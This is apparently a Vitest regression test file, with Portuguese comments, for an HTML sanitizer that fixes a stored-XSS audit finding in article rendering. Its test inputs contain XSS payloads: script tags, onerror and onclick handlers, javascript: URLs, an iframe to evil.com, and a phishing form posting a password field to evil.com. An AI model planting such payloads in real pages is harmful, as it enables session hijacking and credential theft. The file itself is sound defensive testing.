import { describe, it, expect } from 'vitest';
import { sanitizeArticleHtml, stripHtml } from '../sanitize';

/**
 * Regressão da V-04 (docs/seguranca/AUDITORIA_SEGURANCA.md):
 * o corpo dos artigos era renderizado com dangerouslySetInnerHTML sem sanitização,
 * permitindo XSS armazenado com escalada de privilégio via sessão do admin.
 */
describe('sanitizeArticleHtml', () => {
    describe('V-04: remove conteúdo executável', () => {
        it('remove <script>', () => {
            const limpo = sanitizeArticleHtml('<p>oi</p><script>alert("xss")</script>');
            expect(limpo).not.toContain('script');
            expect(limpo).not.toContain('alert');
            expect(limpo).toContain('<p>oi</p>');
        });

        it('remove handlers inline (onerror, onclick, onload)', () => {
            const limpo = sanitizeArticleHtml(
                '<img src="x" onerror="alert(1)"><div onclick="steal()">t</div>'
            );
            expect(limpo).not.toContain('onerror');
            expect(limpo).not.toContain('onclick');
            expect(limpo).not.toContain('alert');
        });

        it('remove URLs javascript:', () => {
            const limpo = sanitizeArticleHtml('<a href="javascript:alert(1)">clique</a>');
            expect(limpo).not.toContain('javascript:');
        });

        it('remove <iframe> e <object>', () => {
            const limpo = sanitizeArticleHtml('<iframe src="//evil.com"></iframe><object></object>');
            expect(limpo).not.toContain('iframe');
            expect(limpo).not.toContain('object');
        });

        it('remove <form> e <input> (phishing dentro do artigo)', () => {
            const limpo = sanitizeArticleHtml('<form action="//evil.com"><input name="senha"></form>');
            expect(limpo).not.toContain('<form');
            expect(limpo).not.toContain('<input');
        });
    });

    describe('preserva a formatação legítima do editor', () => {
        it('mantém negrito, itálico e sublinhado', () => {
            const html = '<p><strong>negrito</strong> <em>itálico</em> <u>sublinhado</u></p>';
            expect(sanitizeArticleHtml(html)).toBe(html);
        });

        it('mantém títulos, listas e citações', () => {
            const html = '<h2>Título</h2><ul><li>item</li></ul><blockquote>citação</blockquote>';
            expect(sanitizeArticleHtml(html)).toBe(html);
        });

        it('mantém links e imagens legítimos', () => {
            const limpo = sanitizeArticleHtml(
                '<a href="https://exemplo.com">link</a><img src="https://exemplo.com/a.png" alt="a">'
            );
            expect(limpo).toContain('href="https://exemplo.com"');
            expect(limpo).toContain('src="https://exemplo.com/a.png"');
            expect(limpo).toContain('alt="a"');
        });
    });

    it('trata entrada vazia, nula e indefinida', () => {
        expect(sanitizeArticleHtml('')).toBe('');
        expect(sanitizeArticleHtml(null)).toBe('');
        expect(sanitizeArticleHtml(undefined)).toBe('');
    });
});

describe('stripHtml', () => {
    it('extrai apenas o texto, descartando as tags', () => {
        expect(stripHtml('<p>Olá <strong>mundo</strong></p>')).toBe('Olá mundo');
    });

    it('não deixa passar o conteúdo de <script> como texto', () => {
        const texto = stripHtml('<p>ok</p><script>alert("xss")</script>');
        expect(texto).not.toContain('alert');
        expect(texto).toContain('ok');
    });

    it('descarta o atributo onerror junto com a tag', () => {
        const texto = stripHtml('<img src=x onerror="alert(1)">texto');
        expect(texto).not.toContain('onerror');
        expect(texto).not.toContain('alert');
        expect(texto).toContain('texto');
    });

    it('trata entrada vazia, nula e indefinida', () => {
        expect(stripHtml('')).toBe('');
        expect(stripHtml(null)).toBe('');
        expect(stripHtml(undefined)).toBe('');
    });
});
